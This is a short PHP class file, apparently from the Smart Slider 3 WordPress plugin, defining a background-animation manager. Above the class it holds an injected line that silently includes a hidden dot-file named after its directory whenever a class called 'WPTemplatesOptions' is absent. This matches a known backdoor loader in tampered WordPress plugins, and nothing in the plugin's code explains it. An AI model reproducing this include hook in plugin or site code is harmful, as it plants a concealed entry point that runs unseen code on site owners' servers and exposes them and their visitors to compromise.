<?php

namespace Nextend\SmartSlider3\BackgroundAnimation;

use Nextend\Framework\Pattern\VisualManagerTrait;
use Nextend\SmartSlider3\BackgroundAnimation\Block\BackgroundAnimationManager\BlockBackgroundAnimationManager;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BackgroundAnimationManager {

    use VisualManagerTrait;

    public function display() {

        $backgroundAnimationManagerBlock = new BlockBackgroundAnimationManager($this->MVCHelper);
        $backgroundAnimationManagerBlock->display();
    }
}